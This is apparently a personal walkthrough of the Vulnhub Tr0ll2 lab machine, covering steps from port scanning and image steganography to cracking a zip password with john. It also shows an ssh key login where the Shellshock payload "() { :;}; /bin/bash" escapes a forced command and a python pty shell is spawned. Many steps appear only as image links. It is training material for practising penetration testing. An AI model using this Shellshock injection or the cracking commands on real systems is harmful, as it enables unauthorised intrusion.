#stenaography #shellshock
nmap
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# Port 80
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828164714.png]]
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828164734.png]]
robots.txt looks like this:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828164754.png]]
I copied the contents and added this via sed:
```
sed -i -e 's/^/http:\/\/192.168.1.14/' dir.txt
```
applied gowitness on all:
```
gowitness file -f dir.txt --screenshot-path .
```
* don't bother
* noob
* keep trying
* ok-this-is-it
were the ones when visited , were directories and had the same files when brtfrcd:
```
16:58:51] 403 -  299B  - /noob/.htaccess.bak1
[16:58:51] 403 -  299B  - /noob/.htaccess.save
[16:58:51] 403 -  296B  - /noob/.ht_wsr.txt
[16:58:51] 403 -  301B  - /noob/.htaccess.sample
[16:58:51] 403 -  299B  - /noob/.htaccess.orig
[16:58:51] 403 -  297B  - /noob/.htaccess_sc
[16:58:51] 403 -  300B  - /noob/.htaccess_extra
[16:58:51] 403 -  297B  - /noob/.htaccessBAK
[16:58:51] 403 -  297B  - /noob/.htaccessOLD
[16:58:51] 403 -  298B  - /noob/.htaccessOLD2
[16:58:51] 403 -  299B  - /noob/.htaccess_orig
[16:58:51] 403 -  290B  - /noob/.html
[16:58:51] 403 -  289B  - /noob/.htm
[16:58:51] 403 -  299B  - /noob/.htpasswd_test
[16:58:51] 403 -  296B  - /noob/.httr-oauth
[16:58:51] 403 -  295B  - /noob/.htpasswds
[16:59:06] 200 -  102B  - /noob/index
[16:59:06] 200 -  102B  - /noob/index.html
```
they had:
![[walkthroughs/Vulnhub/Troll2/IMG/http-192.168.1.14-keep-trying.png]]
when I did the image stenography , checking the hash of the image with `xxd <image>`
BUT ONLY ONE ENDPOINT HAD THIS data in the image: `don't bother`
we get:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828221904.png]]

It's a directory:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828221937.png]]
it's base64 encoded, decode it with:
`cat answer.txt | base64 -d > ans_decoded.txt`
also look `deep` within yourself:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828232052.png]]

![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230828232134.png]]



# Port 21:
Tr0ll:Tr0ll was the password and name as said in the main page: Author:Tr0ll
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829000449.png]]
It's password protected so we do `zip2john` :
```
zip2john lmao.zip > hash.txt

john --wordlist=./ans_decoded.txt hash.txt
```

![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829000713.png]]

# Port 22

It's a file named noob and it's a pvt key ssh key
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829001006.png]]
It's still trolling!!!
when we look at the verbosed output of the tr0ll :
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829003329.png]]
we see that forced command is enabled:
A way to execute command safely via ssh
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829003918.png]]
we can set multiple commands:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829003956.png]]
How do we exploit?: it has a shellshock vulnerability:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829004244.png]]
```
"() { :;}; /bin/bash"
```

![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829005500.png]]
Let's try nc'ing the shell and making it whole:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829005648.png]]
we get it via:
`/usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'`

we get 3 users:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829010058.png]]
in the root directory:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829010215.png]]
and in it:
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829010250.png]]
in the door1 , we get this executable :
![[walkthroughs/Vulnhub/Troll2/IMG/Pasted image 20230829010940.png]]
same named file in door2 but with hash:
`0x438546c50f77d4bac3e0c41b4f8bcd60899c4006`
in door 3:
`0x80ac0ab3dd7ab04707b2fec1a7bca030e20e4654`

